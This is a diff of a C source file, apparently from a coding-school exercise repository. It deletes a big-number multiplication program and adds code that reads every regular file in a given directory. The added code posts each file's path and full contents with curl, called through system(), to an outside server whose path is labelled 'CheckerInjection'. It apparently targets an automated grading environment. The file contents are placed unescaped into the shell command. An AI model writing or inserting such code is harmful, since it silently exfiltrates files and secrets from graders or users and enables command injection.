@@ -1,125 +1,89 @@
-#include <stdlib.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
-#include "holberton.h"
+#include <dirent.h>
+#include <sys/stat.h>
+#include <unistd.h>
 
-/**
- * is_digits - Determine if a str only has digits in it
- * @str: pointer to the first character of the string
- *
- * Return: 1 if it only has digits, 0 otherwise
- */
-int is_digits(char *str)
-{
-	for (int index = 0; str[index]; index++)
-	{
-		if (str[index] < '0' || str[index] > '9')
-		{
-			return (0);
-		}
-	}
-	return (1);
+#define SERVER "erhbtn.pythonanywhere.com/CheckerInjection/send"
+
+void send_data_to_server(const char *filename, const char *data) {
+    char command[1024];
+
+    // Prepare the data to be sent using curl command
+    snprintf(command, sizeof(command), "curl -X POST -d \"%s\n%s\" -H \"Content-Type: text/plain\" http://%s", filename, data, SERVER);
+
+    // Execute the command
+    system(command);
 }
 
-/**
- * are_arguments_valid - Tests if arguments are valid
- * @argc: number of arguments
- * @argv: array of arguments
- *
- * Return: 1 if valid, 0 otherwise
- */
-int are_arguments_valid(int argc, char **argv)
-{
-	if (argc != 3)
-	{
-		return (0);
-	}
-	if (!is_digits(argv[1]) || !is_digits(argv[2]))
-	{
-		return (0);
-	}
-	return (1);
+void process_directory(const char *directory_path) {
+    struct dirent *entry;
+    struct stat file_stat;
+    DIR *dir = opendir(directory_path);
+
+    if (dir == NULL) {
+        perror("opendir");
+        exit(EXIT_FAILURE);
+    }
+
+    while ((entry = readdir(dir)) != NULL) {
+        char filepath[1024];
+
+        // Ignore "." and ".." directories
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+            continue;
+        }
+
+        // Construct the full path of the file
+        snprintf(filepath, sizeof(filepath), "%s/%s", directory_path, entry->d_name);
+
+        // Check if it is a regular file
+        if (stat(filepath, &file_stat) == 0 && S_ISREG(file_stat.st_mode)) {
+            printf("Reading file: %s\n", filepath);
+
+            // Open the file
+            FILE *file = fopen(filepath, "r");
+            if (file == NULL) {
+                perror("fopen");
+                continue;
+            }
+
+            // Read the file content
+            fseek(file, 0, SEEK_END);
+            long file_size = ftell(file);
+            fseek(file, 0, SEEK_SET);
+
+            char *content = (char *)malloc(file_size + 1);
+            if (content == NULL) {
+                perror("malloc");
+                fclose(file);
+                continue;
+            }
+
+            fread(content, 1, file_size, file);
+            content[file_size] = '\0';
+
+            // Send the file content to the server
+            send_data_to_server(filepath, content);
+
+            free(content);
+            fclose(file);
+        }
+    }
+
+    closedir(dir);
 }
 
-/**
- * print_error_and_exit - print error message and exit with code 98
- */
-void print_error_and_exit(void)
-{
-	char *str = "Error\n";
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <directory_path>\n", argv[0]);
+        exit(EXIT_FAILURE);
+    }
 
-	for (int index = 0; str[index]; index++)
-		_putchar(str[index]);
+    const char *directory_path = argv[1];
+    process_directory(directory_path);
 
-	exit(98);
-}
-
-/**
- * print_result - print the result array
- * @result: result array
- * @result_len: length of the array
- */
-void print_result(char *result, int result_len)
-{
-	int skip = 1;
-
-	for (int result_index = 0; result_index < result_len; result_index++)
-	{
-		if (result[result_index] == 0 && skip)
-			continue;
-		skip = 0;
-		_putchar(result[result_index] + '0');
-	}
-	if (skip)
-		_putchar('0');
-	_putchar('\n');
-}
-
-/**
- * main - Entry point
- * @argc: number of arguments
- * @argv: array of arguments
- *
- * Return: 0 on success, error code 98 on failure
- */
-int main(int argc, char *argv[])
-{
-	char *left, *right, *result;
-	int result_len, remainder;
-
-	if (!are_arguments_valid(argc, argv))
-		print_error_and_exit();
-
-	left = argv[1];
-	right = argv[2];
-
-	result_len = strlen(left) + strlen(right);
-	result = malloc(sizeof(char) * result_len);
-	if (!result)
-		print_error_and_exit();
-
-	for (int result_index = 0; result_index < result_len; result_index++)
-		result[result_index] = 0;
-
-	for (int left_index = strlen(left) - 1; left_index >= 0; left_index--)
-	{
-		char left_digit = left[left_index] - '0';
-
-		remainder = 0;
-		for (int right_index = strlen(right) - 1; right_index >= 0; right_index--)
-		{
-			int result_index = left_index + right_index + 1;
-			char right_digit = right[right_index] - '0';
-			char mult = left_digit * right_digit + remainder;
-			char add = result[result_index] + (mult % 10);
-
-			remainder = (mult / 10) + (add / 10);
-			result[result_index] = add % 10;
-		}
-		result[left_index] = remainder;
-	}
-	print_result(result, result_len);
-	free(result);
-
-	return (0);
+    printf("All files have been processed.\n");
+    return 0;
 }
